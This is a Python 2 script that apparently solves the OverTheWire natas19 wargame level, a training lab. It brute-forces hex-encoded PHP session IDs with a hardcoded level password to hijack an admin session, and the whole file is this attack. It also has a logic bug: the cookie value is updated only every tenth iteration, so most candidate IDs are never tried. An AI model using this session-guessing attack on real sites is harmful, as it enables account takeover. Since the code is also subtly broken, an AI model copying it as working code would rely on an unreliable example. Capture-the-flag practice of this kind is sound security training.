#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import requests

url = "http://natas19.natas.labs.overthewire.org?debug&username=admin&password=*"
for sessid in range(0,641):
    if sessid % 10 == 0:
        enc_sessid = (str(sessid) + "-admin").encode("hex")
        print "SESSID:", sessid, enc_sessid
    cookies = dict(PHPSESSID = enc_sessid)
    r = requests.post(url, cookies=cookies, auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"))
    if "You are an admin" in r.text:
        print r.text
        exit()
    else:
        print r.content
